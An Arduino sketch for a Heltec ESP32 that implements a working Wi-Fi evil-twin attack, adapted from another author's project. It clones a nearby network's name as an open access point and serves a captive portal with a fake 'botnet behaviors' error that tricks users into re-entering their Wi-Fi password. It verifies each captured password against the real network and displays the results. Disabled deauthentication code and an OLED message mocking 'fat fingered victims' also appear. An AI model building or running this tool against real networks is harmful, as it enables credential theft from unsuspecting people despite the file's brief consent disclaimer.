/*
THANK YOU to y0xhz for the original code. You can take a look at it here: https://github.com/y0xhz/ESP32-EvilTwin


The original version was based in Indonesian with most comments, webpage elements, etc. being in it. This version aims to
make the code more english friendly with small UX, error handling, as well as performance adjustments, and fixes the deauthentication frame elements. 
Thank you for using it, and please,
  remember to only use this with permission from network AND device owners, or exclusively on your own devices.

Below you will see some settings for the webpage you may want to change such as reasons for re-entering the password into the 
  evil twin, the display orientation, and more.


INFO: This specific file is for the Heltec ESP32 v3, ensure arduino IDE has this board selected: [Heltec WIFI Kit 32(V3)]
        This board can be downloaded through the Arduino IDE libraries by simply searching "HELTEC."

If you are using a non-Heltec board, such as a NodeMCU ESP32, please choose the correct file download.

*/


#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <Wire.h>
#include "heltec.h"

// ^all the different libraries used, dont touch unless you know what you're doing^


/*======== SETTINGS!!! ========*/


/*======== Physical/board settings =======*/

#define flipDisplay false // TO FLIP THE DISPLAY ORIENTATION, JUST CHANGE THIS TO true
#define baudRate 115200 // serial monitor baud rate, press ctrl/cmd+shift+M and then change it to this, or change this to it.
int ledPin = 2; // LED for when wifi connection is attempted/verifying
#define deauthsPerSecond 1000 // How many Deauthentication frames to send per second (default is 1000ms/1 second)

/*===== Webpage settings =====*/

#define SUBTITLE "Error 509 Bandwidth Limit Exceeded." //                                       < error code
#define TITLE "Sign in" //                                                                      < page title
#define BODY "You have been suspected of botnet behaviors. Please re-enter your password." //   < reason
#define POST_TITLE "Checking password..." //                                                    < title of password verifying screen
#define POST_BODY "Please allow ~1 minute for password hashes to verify. </br> Verifying..." // < password verifying body

/*===== CONFIG AP settings ====*/
// note: this is the AP to configure the evil twin AP, not the actual evil twin AP:
#define udefSSID "PentestETwin" // user defined configuration AP name (not evil twin AP name)
#define udefPW "HeltecIsCool1!"       // user defined configuration AP password (not evil twin AP password). (you can set this to "" for it to have no password)
// WARNING: your password MUST be 8+ characters (or 0) or it will set it up as "ESP_....."


// ANYTHING BELOW THIS IS NO LONGER MODIFYING OPTIONS, ONLY CHANGE CODE HERE IF YOU KNOW WHAT YOU'RE DOING:

extern "C" {
  #include "esp_wifi.h" //TODO: add deauth functionality
  #include "esp_wifi_types.h"
}


typedef struct // defining structure to store info about nearby WIFI networks
{
  String ssid; // initialize SSID/network name
  uint8_t ch; // initialize wifi channel
  uint8_t bssid[6]; //initialize BSSID aka MAC address of wifi network, 6 represents array for 6 byte MAC address
//----------------
  uint8_t rs; // initialize RSSI? (signal strength)
  
}  _Network;


const byte DNS_PORT = 53; // define dns port number
IPAddress apIP(192, 168, 1, 1); // ip for AP/dns server
DNSServer dnsServer; // create instance of dns server
WebServer webServer(80); // create webserver as well, port 80/HTTP

_Network _networks[16]; // create array to store wifi info 
_Network _selectedNetwork; // create single _Network structure to represent selected network 

void clearArray() {              // clear the _Network array
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }

}

String _correct = "";
String _tryPassword = "";


String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
    "<head><title>"+a+" :: "+t+"</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>"+CSS+"</style></head>"
    "<body><nav><b>"+a+"</b> "+SUBTITLE+"</nav><div><h1>"+t+"</h1></div><div>";
  return h; }

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' >" +
    "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"OK\"></form></center>" + footer();
}

String posted() {
  return header(POST_TITLE) + POST_BODY + "<script> setTimeout(function(){window.location.href = '/result';}, 15000); </script>" + footer();
}

String footer() { 
  return "</div><div class=q>Broadband communications services <a>&#169; All rights reserved 2022.</a></div>";
}

void setup() {
//  _selectedNetwork.ssid = udefSSID; // <-- debugging step
/* start Display OLED */
  Heltec.begin(true /*DisplayEnable Enable*/, false /*LoRa Disable*/, true /*Serial Enable*/);
  #if flipDisplay
    Heltec.display->flipScreenVertically();
  #endif
  Heltec.display->setFont(ArialMT_Plain_10); //check out the code below, see what it does
  /* led on board 
  pinMode(ledPin, OUTPUT);
    digitalWrite(ledPin, LOW); */
  /* show start screen */
  Heltec.display->clear();
  Heltec.display->drawString(0, 0, "EVIL TWIN");
  Heltec.display->drawString(0, 16, "Starting config AP...");
  Heltec.display->drawString(0, 40, "Copyright (c) 2023");
  Heltec.display->drawString(0, 50, "Y0xhz");
  Heltec.display->display();
  delay(15000);

  Serial.begin(baudRate); // begin serial comms at baud rate provided earlier
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP(udefSSID, udefPW); // SSID name, password, set in beginning
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.onNotFound(handleIndex);
  webServer.begin();
}
void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) { // iterates through all nearby SSID's and lists them
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
//-------------------------------
      network.rs = WiFi.RSSI(i);
      _networks[i] = network;
//-------------------------------
      
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
   }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Password incorrect.</h2><p>Please try again...</p></body> </html>");
 
     //--------------------OLED -----------
    Heltec.display->clear();
    Heltec.display->drawString(0, 0, "Incorrect password provided.");
    Heltec.display->drawString(0, 16, "stupid fat fingered victims...");
    Heltec.display->display();  
    delay(4000);
       
    Serial.println("Incorrect password provided!");
  } else {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Password Correct! You should be redirected shortly.</h2></body> </html>");
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP(udefSSID, udefPW); // TODO: THEORETICALLY i dont think i need this 2nd declaration. try deleting it?
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "Success! Password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    Serial.println("Password OK !");
    Serial.println(_correct);
  }
}

char _tempHTML[] PROGMEM = R"=====(
<html>
    <head>
        <meta name='viewport' content='initial-scale=1.0, width=device-width'>
        <title>Evil Twin</title>
        <style>
            body {
                background: #1a1a1a;
                color: #bfbfbf;
                font-family: sans-serif;
                margin: 0;
            }
            .content {max-width: 800px;margin: auto;}
            table {border-collapse: collapse;}
            th, td {
                padding: 10px 6px;
                text-align: left;
                border-style:solid;
                border-color: orange;
            }
            button {
                display: inline-block;
                height: 38px;
                padding: 0 20px;
                color:#fff;
                text-align: center;
                font-size: 11px;
                font-weight: 600;
                line-height: 38px;
                letter-spacing: .1rem;
                text-transform: uppercase;
                text-decoration: none;
                white-space: nowrap;
                background: #2f3136;
                border-radius: 4px;
                border: none;
                cursor: pointer;
                box-sizing: border-box;
            }
            button:hover {
                background: #42444a;
            }
            h1 {
                font-size: 1.7rem;
                margin-top: 1rem;
                background: #2f3136;
                color: #bfbfbb;
                padding: 0.2em 1em;
                border-radius: 3px;
                border-left: solid #20c20e 5px;
                font-weight: 100;
            }
        </style>
    </head>
    <body>
        <div class='content'>
        <p>
            <h1 style="border: solid #20c20e 3px; padding: 0.2em 0.2em; text-align: center; font-size: 2.5rem;">Wifi Pentest</h1>
            <span style="color: #F04747;">Anything below 190 may not work.</span><br>
        </p><br><hr><br>
        <h1>Attack mode</h1>
        <div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>
        <button style='display:inline-block;'{disabled}>{deauth_button}</button></form>
        <form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>
        <button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>
        </div><br><hr><br>
        <h1>Panel Target</h1>
        <table>
        <tr><th>SSID</th><th>SIGNAL</th><th>BSSID</th><th>CHANNEL</th><th>SELECT</th></tr>
              
)=====";

void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(udefSSID, udefPW);
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      } // TODO: comment out bottom line if nothing works
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
     
      //------------------------
        _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + _networks[i].rs + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
     //-------------------------

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #20c20e; color:black;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop Deauth");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start Deauth");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop Evil-Twin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start Evil-Twin");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table><br><hr><br>";

    if (_correct != "") {
      _html += "<h1>Hasil</h1></br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      digitalWrite(ledPin, LOW);
      delay(500);

      //--------------------OLED -----------
    Heltec.display->clear();
    Heltec.display->drawString(0, 0, "PASS CAPTURED!");
    Heltec.display->drawString(0, 16, "Verifying Password ... ");
    Heltec.display->display();   
    
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", posted());
    } else {
      webServer.send(200, "text/html", index());
    }
  }

}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
/*
  if (deauthing_active && millis() - deauth_now >= deauthsPerSecond) {

    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x00, 0x00, 0x01, 0x00};
    
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }
*/
  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {

      /* show start screen */
  Heltec.display->clear();
  Heltec.display->drawString(0, 0, "ETWIN MONITOR");
  Heltec.display->drawString(0, 16, "AP ONLINE!" ); // ADD SSID OF THE ESP32 HERE
  Heltec.display->drawString(0, 40, "Copyright (c) 2023");
  Heltec.display->drawString(0, 50, "Y0xhz");
  Heltec.display->display();
  delay(1000);
  
      Serial.println("WIFI UP, STANDBY"); // TODO: wtf?
    } else {

      //--------------------OLED -----------
    Heltec.display->clear();
    Heltec.display->drawString(0, 0, _selectedNetwork.ssid.c_str());
    Heltec.display->drawString(0, 16, "Password :");
    Heltec.display->drawString(0, 40, _tryPassword);
    Heltec.display->display();
    
      Serial.println("CORRECT");
    }
    wifinow = millis();
  }
}
